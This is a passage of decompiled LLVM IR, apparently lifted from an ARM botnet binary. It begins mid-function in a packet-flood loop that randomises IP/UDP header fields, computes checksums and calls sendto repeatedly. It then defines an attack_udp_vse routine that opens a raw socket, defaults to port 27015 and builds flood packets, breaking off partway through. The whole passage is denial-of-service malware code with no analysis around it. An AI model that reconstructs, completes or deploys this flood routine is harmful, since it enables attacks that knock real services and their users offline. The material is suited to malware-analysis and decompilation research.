  %v1_d018 = phi i32 [ %v1_d0e0, %dec_label_pc_d06c ], [ 0, %dec_label_pc_d000 ]
  %v5_d008 = mul i32 %v1_d018, 24
  %v1_d00c = load i32, i32* @r8, align 4
  %v2_d00c = add i32 %v1_d00c, %v5_d008
  store i32 %v2_d00c, i32* %r3.global-to-local, align 4
  store i32 %v2_cd14, i32* %r1.global-to-local, align 4
  %v1_d014 = add i32 %v2_d00c, 20
  %v2_d014 = inttoptr i32 %v1_d014 to i8*
  %v3_d014 = load i8, i8* %v2_d014, align 1
  %v4_d014 = zext i8 %v3_d014 to i32
  store i32 %v4_d014, i32* %r2.global-to-local, align 4
  %v4_d018 = mul i32 %v1_d018, 4
  %v5_d018 = add i32 %v4_d018, %v2_cd14
  %v6_d018 = inttoptr i32 %v5_d018 to i32*
  %v7_d018 = load i32, i32* %v6_d018, align 4
  store i32 %v7_d018, i32* @r5, align 4
  %v7_d01c = icmp eq i8 %v3_d014, 31
  store i1 %v7_d01c, i1* %cpsr_z.global-to-local, align 1
  %v1_d020 = add i32 %v7_d018, 20
  store i32 %v1_d020, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_d014, 32
  br i1 %tmp62, label %dec_label_pc_d104, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_d004
  store i32 %v6_ce1c, i32* %r3.global-to-local, align 4
  store i1 %v8_d15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d15c, label %dec_label_pc_d164, label %dec_label_pc_d034

dec_label_pc_d034:                                ; preds = %dec_label_pc_d104, %dec_label_pc_d028
  store i32 %v3_ceac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d174, label %dec_label_pc_d180, label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_d164.dec_label_pc_d048_crit_edge, %dec_label_pc_d034
  %v1_d04c = phi i32 [ %v1_d04c.pre, %dec_label_pc_d164.dec_label_pc_d048_crit_edge ], [ 65535, %dec_label_pc_d034 ]
  store i32 %v3_ce8c, i32* %r0.global-to-local, align 4
  %v9_d04c = icmp eq i32 %v3_ce8c, %v1_d04c
  store i1 %v9_d04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d04c, label %dec_label_pc_d194, label %dec_label_pc_d054

dec_label_pc_d054:                                ; preds = %dec_label_pc_d180, %dec_label_pc_d048
  %v1_d058 = phi i32 [ %v1_d18c, %dec_label_pc_d180 ], [ %v1_d04c, %dec_label_pc_d048 ]
  store i32 %v3_cea4, i32* %r1.global-to-local, align 4
  %v9_d058 = icmp eq i32 %v3_cea4, %v1_d058
  store i1 %v9_d058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d058, label %dec_label_pc_d1a8, label %dec_label_pc_d060

dec_label_pc_d060:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d054
  store i32 %v1_ce08, i32* %r3.global-to-local, align 4
  store i1 %v2_d1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d1b0, label %dec_label_pc_d06c, label %dec_label_pc_d1bc

dec_label_pc_d06c:                                ; preds = %dec_label_pc_d060, %dec_label_pc_d1a8, %dec_label_pc_d1bc
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_d070 = load i32, i32* @r5, align 4
  %v3_d070 = add i32 %v2_d070, 10
  %v4_d070 = inttoptr i32 %v3_d070 to i16*
  store i16 0, i16* %v4_d070, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_d078 = load i32, i32* @r5, align 4
  store i32 %v0_d078, i32* @r0, align 4
  %v2_d07c = call i32 @checksum_generic(i32 %v0_d078, i32 20)
  %v3_d07c = trunc i32 %v2_d07c to i16
  %v3_d080 = load i32, i32* @r5, align 4
  %v4_d080 = add i32 %v3_d080, 10
  %v5_d080 = inttoptr i32 %v4_d080 to i16*
  store i16 %v3_d07c, i16* %v5_d080, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d088 = load i32, i32* @r6, align 4
  %v3_d088 = add i32 %v2_d088, 6
  %v4_d088 = inttoptr i32 %v3_d088 to i16*
  store i16 0, i16* %v4_d088, align 2
  %v0_d08c = load i32, i32* @r6, align 4
  store i32 %v0_d08c, i32* @r1, align 4
  %v1_d090 = add i32 %v0_d08c, 4
  %v2_d090 = inttoptr i32 %v1_d090 to i16*
  %v3_d090 = load i16, i16* %v2_d090, align 2
  %v4_d090 = zext i16 %v3_d090 to i32
  store i32 %v4_d090, i32* %r2.global-to-local, align 4
  %v0_d094 = load i32, i32* @sl, align 4
  store i32 %v0_d094, i32* %r3.global-to-local, align 4
  %v0_d098 = load i32, i32* @r5, align 4
  store i32 %v0_d098, i32* %r0.global-to-local, align 4
  %v4_d09c = call i32 @checksum_tcpudp(i32 %v0_d098, i32 %v0_d08c, i32 %v4_d090, i32 %v0_d094)
  %v5_d09c = trunc i32 %v4_d09c to i16
  store i32 %v4_d09c, i32* %r0.global-to-local, align 4
  %v3_d0a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d0a0, i32* %r3.global-to-local, align 4
  %v3_d0a4 = mul i32 %v3_d0a0, 32
  store i32 %v3_d0a4, i32* %lr.global-to-local, align 4
  %v3_d0a8 = load i32, i32* @r6, align 4
  %v4_d0a8 = add i32 %v3_d0a8, 6
  %v5_d0a8 = inttoptr i32 %v4_d0a8 to i16*
  store i16 %v5_d09c, i16* %v5_d0a8, align 2
  %v0_d0ac = load i32, i32* %lr.global-to-local, align 4
  %v1_d0ac = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_d0ac, -8
  %v5_d0ac = add i32 %v0_d0ac, %tmp63
  store i32 %v5_d0ac, i32* %lr.global-to-local, align 4
  %v0_d0b0 = load i32, i32* @r6, align 4
  %v1_d0b0 = add i32 %v0_d0b0, 2
  %v2_d0b0 = inttoptr i32 %v1_d0b0 to i16*
  %v3_d0b0 = load i16, i16* %v2_d0b0, align 2
  %v4_d0b0 = zext i16 %v3_d0b0 to i32
  store i32 %v4_d0b0, i32* @r6, align 4
  %v1_d0b4 = load i32, i32* @r8, align 4
  %v2_d0b4 = add i32 %v1_d0b4, %v5_d0ac
  store i32 %v2_d0b4, i32* @lr, align 4
  %v3_d0b8 = add i32 %v2_d0b4, 2
  %v4_d0b8 = inttoptr i32 %v3_d0b8 to i16*
  store i16 %v3_d0b0, i16* %v4_d0b8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d0c4 = load i32, i32* @r5, align 4
  store i32 %v0_d0c4, i32* %r1.global-to-local, align 4
  %v0_d0c8 = load i32, i32* @fp, align 4
  store i32 %v0_d0c8, i32* %r0.global-to-local, align 4
  %v0_d0cc = load i32, i32* @sb, align 4
  store i32 %v0_d0cc, i32* %r2.global-to-local, align 4
  %v0_d0d0 = load i32, i32* @lr, align 4
  %v6_d0d8 = call i32 @__libc_sendto(i32 %v0_d0c8, i32 %v0_d0c4, i32 %v0_d0cc, i32 16384, i32 %v0_d0d0, i32 16)
  %v3_d0dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d0dc, i32* %r3.global-to-local, align 4
  %v1_d0e0 = add i32 %v3_d0dc, 1
  store i32 %v1_d0e0, i32* %r0.global-to-local, align 4
  %v1_d0e4 = load i32, i32* @r7, align 4
  %v9_d0e4 = icmp eq i32 %v1_d0e0, %v1_d0e4
  store i1 %v9_d0e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d0e0, i32* %stack_var_-44, align 4
  %v5_d0ec = icmp slt i32 %v1_d0e0, %v1_d0e4
  br i1 %v5_d0ec, label %dec_label_pc_d004, label %dec_label_pc_d0f0

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d06c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d0f4 = icmp eq i32 %v1_d0e4, 0
  store i1 %v2_d0f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d0f4, label %dec_label_pc_cff0, label %dec_label_pc_d000

dec_label_pc_d104:                                ; preds = %dec_label_pc_d004
  %v1_d104 = add i32 %v2_d00c, 16
  %v2_d104 = inttoptr i32 %v1_d104 to i32*
  %v3_d104 = load i32, i32* %v2_d104, align 4
  %v0_d108 = call i32 @rand_next()
  store i32 %v0_d108, i32* %r0.global-to-local, align 4
  %v3_d10c = load i32, i32* %stack_var_-44, align 4
  %v5_d114 = mul i32 %v3_d10c, 24
  %v1_d118 = and i32 %v3_d104, 16711680
  store i32 %v1_d118, i32* %ip.global-to-local, align 4
  %v3_d11c = udiv i32 %v3_d104, 16777216
  %v4_d120 = udiv i32 %v1_d118, 256
  %v5_d120 = or i32 %v4_d120, %v3_d11c
  store i32 %v5_d120, i32* %r2.global-to-local, align 4
  %v1_d124 = load i32, i32* @r8, align 4
  %v2_d124 = add i32 %v1_d124, %v5_d114
  store i32 %v2_d124, i32* %r1.global-to-local, align 4
  %v1_d128 = and i32 %v3_d104, 65280
  store i32 %v1_d128, i32* %r3.global-to-local, align 4
  %v1_d12c = add i32 %v2_d124, 20
  %v2_d12c = inttoptr i32 %v1_d12c to i8*
  %v3_d12c = load i8, i8* %v2_d12c, align 1
  %v4_d12c = zext i8 %v3_d12c to i32
  store i32 %v4_d12c, i32* %ip.global-to-local, align 4
  %v5_d134 = call i32 @llvm.bswap.i32(i32 %v3_d104)
  %v7_d138 = lshr i32 %v0_d108, %v4_d12c
  %v8_d138 = add i32 %v7_d138, %v5_d134
  store i32 %v8_d138, i32* %r2.global-to-local, align 4
  %v1_d13c = and i32 %v8_d138, 16711680
  store i32 %v1_d13c, i32* %r0.global-to-local, align 4
  %v1_d148 = and i32 %v8_d138, 65280
  store i32 %v1_d148, i32* %r1.global-to-local, align 4
  %v5_d150 = call i32 @llvm.bswap.i32(i32 %v8_d138)
  %v1_d154 = load i32, i32* @r5, align 4
  %v2_d154 = add i32 %v1_d154, 16
  %v3_d154 = inttoptr i32 %v2_d154 to i32*
  store i32 %v5_d150, i32* %v3_d154, align 4
  store i32 %v6_ce1c, i32* %r3.global-to-local, align 4
  store i1 %v8_d15c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d15c, label %dec_label_pc_d164, label %dec_label_pc_d034

dec_label_pc_d164:                                ; preds = %dec_label_pc_d104, %dec_label_pc_d028
  %v0_d164 = call i32 @rand_next()
  store i32 %v0_d164, i32* %r0.global-to-local, align 4
  store i32 %v3_ceac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_d174, i1* %cpsr_z.global-to-local, align 1
  %v1_d178 = load i32, i32* @r5, align 4
  %v2_d178 = add i32 %v1_d178, 12
  %v3_d178 = inttoptr i32 %v2_d178 to i32*
  store i32 %v0_d164, i32* %v3_d178, align 4
  br i1 %v3_d174, label %dec_label_pc_d180, label %dec_label_pc_d164.dec_label_pc_d048_crit_edge

dec_label_pc_d164.dec_label_pc_d048_crit_edge:    ; preds = %dec_label_pc_d164
  %v1_d04c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d048

dec_label_pc_d180:                                ; preds = %dec_label_pc_d164, %dec_label_pc_d034
  %v0_d180 = call i32 @rand_next()
  %v1_d180 = trunc i32 %v0_d180 to i16
  %v3_d184 = load i32, i32* @r5, align 4
  %v4_d184 = add i32 %v3_d184, 4
  %v5_d184 = inttoptr i32 %v4_d184 to i16*
  store i16 %v1_d180, i16* %v5_d184, align 2
  store i32 %v3_ce8c, i32* %r0.global-to-local, align 4
  %v1_d18c = load i32, i32* @r4, align 4
  %v9_d18c = icmp eq i32 %v3_ce8c, %v1_d18c
  store i1 %v9_d18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d18c, label %dec_label_pc_d194, label %dec_label_pc_d054

dec_label_pc_d194:                                ; preds = %dec_label_pc_d180, %dec_label_pc_d048
  %v0_d194 = call i32 @rand_next()
  %v1_d194 = trunc i32 %v0_d194 to i16
  store i32 %v0_d194, i32* %r0.global-to-local, align 4
  store i32 %v3_cea4, i32* %r1.global-to-local, align 4
  %v1_d19c = load i32, i32* @r4, align 4
  %v9_d19c = icmp eq i32 %v3_cea4, %v1_d19c
  store i1 %v9_d19c, i1* %cpsr_z.global-to-local, align 1
  %v3_d1a0 = load i32, i32* @r5, align 4
  %v4_d1a0 = add i32 %v3_d1a0, 20
  %v5_d1a0 = inttoptr i32 %v4_d1a0 to i16*
  store i16 %v1_d194, i16* %v5_d1a0, align 2
  br i1 %v9_d19c, label %dec_label_pc_d1a8, label %dec_label_pc_d060

dec_label_pc_d1a8:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d054
  %v0_d1a8 = call i32 @rand_next()
  %v1_d1a8 = trunc i32 %v0_d1a8 to i16
  store i32 %v0_d1a8, i32* %r0.global-to-local, align 4
  store i32 %v1_ce08, i32* %r3.global-to-local, align 4
  store i1 %v2_d1b0, i1* %cpsr_z.global-to-local, align 1
  %v3_d1b4 = load i32, i32* @r6, align 4
  %v4_d1b4 = add i32 %v3_d1b4, 2
  %v5_d1b4 = inttoptr i32 %v4_d1b4 to i16*
  store i16 %v1_d1a8, i16* %v5_d1b4, align 2
  br i1 %v2_d1b0, label %dec_label_pc_d06c, label %dec_label_pc_d1bc

dec_label_pc_d1bc:                                ; preds = %dec_label_pc_d060, %dec_label_pc_d1a8
  %v0_d1bc = load i32, i32* @r5, align 4
  %v1_d1bc = add i32 %v0_d1bc, 28
  store i32 %v1_d1bc, i32* %r0.global-to-local, align 4
  store i32 %v0_ced4, i32* %r1.global-to-local, align 4
  %v2_d1c4 = inttoptr i32 %v1_d1bc to i16*
  %v3_d1c4 = call i32 @rand_str(i16* %v2_d1c4, i32 %v0_ced4)
  store i32 %v3_d1c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d06c

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_ce40
  %v0_d1cc = load i32, i32* @fp, align 4
  store i32 %v0_d1cc, i32* %r0.global-to-local, align 4
  %v1_d1d0 = call i32 @__GI___libc_close(i32 %v0_d1cc)
  store i32 %v1_d1d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d1d4

dec_label_pc_d1d4:                                ; preds = %entry, %dec_label_pc_d1cc
  %v1_d1dc = phi i32 [ %v3_ce30, %entry ], [ %v1_d1d0, %dec_label_pc_d1cc ]
  store i32 %v18_ccf8, i32* %sb.global-to-local, align 4
  store i32 %v27_ccf8, i32* %lr.global-to-local, align 4
  ret i32 %v1_d1dc

; uselistorder directives
  uselistorder i32 %v0_d1a8, { 1, 0 }
  uselistorder i32 %v0_d194, { 1, 0 }
  uselistorder i32 %v1_d18c, { 1, 0 }
  uselistorder i32 %v3_d104, { 2, 1, 3, 0 }
  uselistorder i32 %v1_d0e0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_d0ac, { 1, 0 }
  uselistorder i32 %v4_d09c, { 1, 0 }
  uselistorder i1 %v2_d1b0, { 2, 3, 1, 0 }
  uselistorder i1 %v3_d174, { 3, 2, 0, 1 }
  uselistorder i32 %v3_cf20, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_cf08, { 1, 0 }
  uselistorder i32 %v1_ced8, { 1, 0, 2 }
  uselistorder i32 %v1_ced4, { 1, 0, 2 }
  uselistorder i32 %v3_ceac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ce94, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ce8c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ce84, { 1, 0, 2 }
  uselistorder i32 %v0_ced4, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ce74, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ce60, { 1, 0 }
  uselistorder i1 %v7_ce34, { 1, 0 }
  uselistorder i32 %v3_ce30, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_ce1c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_ce08, { 2, 1, 3, 0 }
  uselistorder i32 %v1_cd94, { 1, 0 }
  uselistorder i32 %v1_cd70, { 1, 0 }
  uselistorder i32 %v6_cd68, { 1, 0 }
  uselistorder i32 %v7_cd50, { 1, 0, 2, 3 }
  uselistorder i8 %v5_cd4c, { 1, 0 }
  uselistorder i32 %v6_cd2c, { 1, 0 }
  uselistorder i32 %v2_cd14, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 31, 30, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1d4, { 1, 0 }
  uselistorder label %dec_label_pc_d1bc, { 1, 0 }
  uselistorder label %dec_label_pc_d06c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d000, { 1, 0 }
  uselistorder label %dec_label_pc_cff0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cff0.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d1e4 = load i32, i32* @r4, align 4
  %v27_d1e4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d200 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_d204 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d200, i32* @fp, align 4
  %v0_d214 = load i32, i32* @r4, align 4
  %v4_d218 = inttoptr i32 %v0_d204 to i32*
  %v5_d218 = call i32 @attack_get_opt_int(i32 %v0_d214, i32* %v4_d218, i32 2, i32 0)
  %v1_d224 = urem i32 %v5_d218, 256
  store i32 %v1_d224, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d230 = load i32, i32* @r4, align 4
  %v0_d234 = load i32, i32* @r5, align 4
  %v5_d238 = trunc i32 %v5_d218 to i8
  %v6_d23c = inttoptr i32 %v0_d234 to i32*
  %v7_d23c = call i32 @attack_get_opt_int(i32 %v0_d230, i32* %v6_d23c, i32 3, i32 65535)
  %v0_d240 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d23c, i32* @r7, align 4
  %v0_d250 = load i32, i32* @r4, align 4
  %v4_d254 = inttoptr i32 %v0_d240 to i32*
  %v5_d254 = call i32 @attack_get_opt_int(i32 %v0_d250, i32* %v4_d254, i32 4, i32 64)
  %v1_d25c = urem i32 %v5_d254, 256
  store i32 %v1_d25c, i32* %ip.global-to-local, align 4
  %v0_d260 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d26c = load i32, i32* @r4, align 4
  %v6_d274 = inttoptr i32 %v0_d260 to i32*
  %v7_d274 = call i32 @attack_get_opt_int(i32 %v0_d26c, i32* %v6_d274, i32 5, i32 0)
  %v1_d280 = urem i32 %v7_d274, 256
  store i32 %v1_d280, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d28c = load i32, i32* @r4, align 4
  %v0_d290 = load i32, i32* @r5, align 4
  %v5_d298 = inttoptr i32 %v0_d290 to i32*
  %v6_d298 = call i32 @attack_get_opt_int(i32 %v0_d28c, i32* %v5_d298, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d2a8 = load i32, i32* @r5, align 4
  store i32 %v6_d298, i32* @r6, align 4
  %v0_d2b0 = load i32, i32* @r4, align 4
  %v4_d2b4 = inttoptr i32 %v0_d2a8 to i32*
  %v5_d2b4 = call i32 @attack_get_opt_int(i32 %v0_d2b0, i32* %v4_d2b4, i32 7, i32 27015)
  store i32 %v5_d2b4, i32* @r4, align 4
  %v1_d2c0 = call i32 @table_unlock_val(i32 29)
  %v3_d2cc = call i32 @table_retrieve_val(i32 29, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d2e0 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_d2e4 = icmp eq i32 %v3_d2e0, -1
  store i1 %v7_d2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d2e0, i32* @sb, align 4
  br i1 %v7_d2e4, label %dec_label_pc_d60c, label %dec_label_pc_d2f0

dec_label_pc_d2f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d2f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d2f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d30c = call i32 @__GI_setsockopt(i32 %v3_d2e0, i32 0, i32 3, i32 %v6_d2f8, i32 ptrtoint (i32* @0 to i32))
  %v7_d310 = icmp eq i32 %v5_d30c, -1
  store i1 %v7_d310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d310, label %dec_label_pc_d604, label %dec_label_pc_d318

dec_label_pc_d318:                                ; preds = %dec_label_pc_d2f0
  %v0_d318 = load i32, i32* @r4, align 4
  %v3_d318 = mul i32 %v0_d318, 65536
  store i32 %v3_d318, i32* @lr, align 4
  %v0_d31c = load i32, i32* @r7, align 4
  %v0_d320 = load i32, i32* @r6, align 4
  %v3_d320 = mul i32 %v0_d320, 65536
  store i32 %v3_d320, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_d328 = urem i32 %v0_d31c, 65536
  %v3_d32c = urem i32 %v0_d320, 65536
  store i32 %v3_d32c, i32* %r2.global-to-local, align 4
  %v3_d330 = urem i32 %v0_d318, 65536
  store i32 %v3_d330, i32* %r3.global-to-local, align 4
  %v0_d334 = load i32, i32* @r8, align 4
  %v2_d334 = icmp eq i32 %v0_d334, 0
  store i1 %v2_d334, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d334, label %dec_label_pc_d470.preheader, label %dec_label_pc_d34c

dec_label_pc_d34c:                                ; preds = %dec_label_pc_d318
  %tmp34 = mul i32 %v0_d31c, 256
  %v3_d35c = and i32 %tmp34, 65280
  store i32 %v3_d35c, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_d320, 256
  %v3_d360 = and i32 %tmp35, 65280
  store i32 %v3_d360, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_d318, 256
  %v3_d364 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_d31c, 256
  %v4_d368 = urem i32 %tmp37, 256
  %v5_d368 = or i32 %v4_d368, %v3_d35c
  store i32 %v5_d368, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_d320, 256
  %v4_d36c = urem i32 %tmp38, 256
  %v5_d36c = or i32 %v4_d36c, %v3_d360
  store i32 %v5_d36c, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_d318, 256
  %v4_d370 = urem i32 %tmp39, 256
  %v5_d370 = or i32 %v4_d370, %v3_d364
  store i32 %v5_d370, i32* @r7, align 4
  %v1_d3f8 = trunc i32 %v5_d254 to i8
  br label %dec_label_pc_d374

dec_label_pc_d374:                                ; preds = %.thread, %dec_label_pc_d34c
  %v2_d37c = call i32 @calloc(i32 128, i32 1)
  %v3_d380 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d380, i32* %r2.global-to-local, align 4
  %v5_d388 = mul i32 %v3_d380, 24
  store i32 %v5_d388, i32* %r3.global-to-local, align 4
  %v1_d38c = load i32, i32* @fp, align 4
  %v2_d38c = load i32, i32* @r4, align 4
  %v5_d38c = mul i32 %v2_d38c, 4
  %v6_d38c = add i32 %v5_d38c, %v1_d38c
  %v7_d38c = inttoptr i32 %v6_d38c to i32*
  store i32 %v2_d37c, i32* %v7_d38c, align 4
  %v0_d390 = load i32, i32* %r3.global-to-local, align 4
  %v1_d390 = load i32, i32* @sl, align 4
  %v2_d390 = add i32 %v1_d390, %v0_d390
  store i32 %v2_d390, i32* %r3.global-to-local, align 4
  %v0_d394 = load i32, i32* @fp, align 4
  %v1_d394 = load i32, i32* %r2.global-to-local, align 4
  %v4_d394 = mul i32 %v1_d394, 4
  %v5_d394 = add i32 %v4_d394, %v0_d394
  %v6_d394 = inttoptr i32 %v5_d394 to i32*
  %v7_d394 = load i32, i32* %v6_d394, align 4
  store i32 %v7_d394, i32* @lr, align 4
  %v1_d39c = inttoptr i32 %v7_d394 to i8*
  %v2_d39c = load i8, i8* %v1_d39c, align 1
  %tmp = urem i8 %v2_d39c, 16
  %v1_d3a0 = zext i8 %tmp to i32
  %v1_d3a4 = or i32 %v1_d3a0, 64
  store i32 %v1_d3a4, i32* %r3.global-to-local, align 4
  %v1_d3ac = trunc i32 %v1_d3a4 to i8
  store i8 %v1_d3ac, i8* %v1_d39c, align 1
  %v0_d3b0 = load i32, i32* @lr, align 4
  %v1_d3b0 = inttoptr i32 %v0_d3b0 to i8*
  %v2_d3b0 = load i8, i8* %v1_d3b0, align 1
  %v1_d3b4 = and i8 %v2_d3b0, -16
  %v1_d3b8 = or i8 %v1_d3b4, 5
  store i8 %v1_d3b8, i8* %v1_d3b0, align 1
  %v2_d3c4 = load i32, i32* @lr, align 4
  %v3_d3c4 = add i32 %v2_d3c4, 1
  %v4_d3c4 = inttoptr i32 %v3_d3c4 to i8*
  store i8 %v5_d238, i8* %v4_d3c4, align 1
  %v3_d3c8 = load i32, i32* %stack_var_-48, align 4
  %v3_d3cc = mul i32 %v3_d3c8, 65536
  %v1_d3d0 = add i32 %v3_d3cc, 2097152
  %v3_d3d4 = udiv i32 %v1_d3d0, 256
  %v4_d3dc = udiv i32 %v1_d3d0, 16777216
  %v5_d3dc = or i32 %v3_d3d4, %v4_d3dc
  %v3_d3e0 = urem i32 %v3_d3c8, 65536
  store i32 %v3_d3e0, i32* %r2.global-to-local, align 4
  %v1_d3e4 = trunc i32 %v5_d3dc to i16
  %v2_d3e4 = load i32, i32* @lr, align 4
  %v3_d3e4 = add i32 %v2_d3e4, 2
  %v4_d3e4 = inttoptr i32 %v3_d3e4 to i16*
  store i16 %v1_d3e4, i16* %v4_d3e4, align 2
  %v0_d3e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3e8 = mul i32 %v0_d3e8, 65536
  %v3_d3f0 = add i32 %v1_d3e8, 786432
  store i32 %v3_d3f0, i32* %r2.global-to-local, align 4
  store i32 %v1_d280, i32* %ip.global-to-local, align 4
  %v2_d3f8 = load i32, i32* @lr, align 4
  %v3_d3f8 = add i32 %v2_d3f8, 8
  %v4_d3f8 = inttoptr i32 %v3_d3f8 to i8*
  store i8 %v1_d3f8, i8* %v4_d3f8, align 1
  %v0_d3fc = load i32, i32* %r2.global-to-local, align 4
  %v3_d3fc = udiv i32 %v0_d3fc, 256
  %v1_d400 = and i32 %v3_d3fc, 65280
  %v0_d404 = load i32, i32* %ip.global-to-local, align 4
  %v2_d404 = icmp eq i32 %v0_d404, 0
  store i1 %v2_d404, i1* %cpsr_z.global-to-local, align 1
  %v4_d408 = udiv i32 %v0_d3fc, 16777216
  %v5_d408 = or i32 %v1_d400, %v4_d408
  store i32 %v5_d408, i32* %ip.global-to-local, align 4
  %v2_d410 = load i32, i32* @lr, align 4
  %v3_d410 = add i32 %v2_d410, 9
  %v4_d410 = inttoptr i32 %v3_d410 to i8*
  store i8 17, i8* %v4_d410, align 1
  store i32 ptrtoint (i32* @global_var_26e50.101 to i32), i32* %r3.global-to-local, align 4
  %v0_d418 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d418, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d374
  store i32 64, i32* %r2.global-to-local, align 4
